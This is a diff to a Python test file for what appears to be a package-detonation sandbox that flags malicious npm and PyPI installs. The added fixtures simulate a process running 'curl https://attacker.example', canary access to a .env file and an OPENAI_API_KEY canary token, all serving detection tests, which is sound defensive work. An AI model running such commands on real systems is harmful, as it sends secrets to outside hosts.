@@ -14,6 +14,7 @@ def test_build_plan_pins_npm_version():
         requested_version="latest",
         resolved_version="1.2.3",
         exists=True,
+        metadata={"bin": {"pkg": "dist/cli.js"}},
     )
 
     plan = detonator.build_plan(request, registry)
@@ -21,6 +22,7 @@ def test_build_plan_pins_npm_version():
     assert plan.package_spec == "@scope/pkg@1.2.3"
     assert "npm install" in plan.install_command
     assert "@scope/pkg" in plan.probe_command
+    assert plan.extra_probe_commands
 
 
 def test_build_plan_pins_pypi_version_and_import_probe():
@@ -48,6 +50,7 @@ def test_extract_evidence_detects_canary_network_exec_and_file_changes():
         workdir="/home/user/packageproof-work",
         install_command="pip install bad-pkg",
         probe_command="python -c import bad_pkg",
+        extra_probe_commands=[],
     )
     before = "/home/user/.env\t36\t1.0\n"
     after = (
@@ -67,6 +70,12 @@ def test_extract_evidence_detects_canary_network_exec_and_file_changes():
         "strace_check": {"exit_code": 0, "stdout": "/usr/bin/strace\n", "stderr": ""},
         "install": {"exit_code": 0, "stdout": "", "stderr": ""},
         "probe": {"exit_code": 0, "stdout": "", "stderr": ""},
+        "ps_before": {"exit_code": 0, "stdout": "1 0 init init\n", "stderr": ""},
+        "ps_after": {
+            "exit_code": 0,
+            "stdout": "1 0 init init\n99 1 curl curl https://attacker.example\n",
+            "stderr": "",
+        },
     }
 
     evidence = detonator.extract_evidence(
@@ -75,12 +84,20 @@ def test_extract_evidence_detects_canary_network_exec_and_file_changes():
         before_snapshot=before,
         after_snapshot=after,
         strace_text=strace,
+        canary_token="OPENAI_API_KEY",
     )
 
     assert evidence["filesystem"]["canary_accesses"][0]["path"] == "/home/user/.env"
-    assert evidence["network"]["events"][0]["host"] == "203.0.113.10"
+    hosts = {event["host"] for event in evidence["network"]["events"]}
+    assert {"203.0.113.10", "attacker.example"} <= hosts
     assert "/home/user/packageproof-work/dropper.js" in evidence["filesystem"]["added"]
     assert any(
         chain["type"] == "sandbox_possible_secret_exfiltration"
         for chain in evidence["behavior_chain"]
     )
+    classifications = {
+        event["host"]: event["classification"] for event in evidence["network"]["events"]
+    }
+    assert classifications["203.0.113.10"] == "raw_ip_or_cdn"
+    assert evidence["process"]["events"][0]["type"] == "suspicious_process"
+    assert evidence["artifacts"]["strace_line_count"] == 3
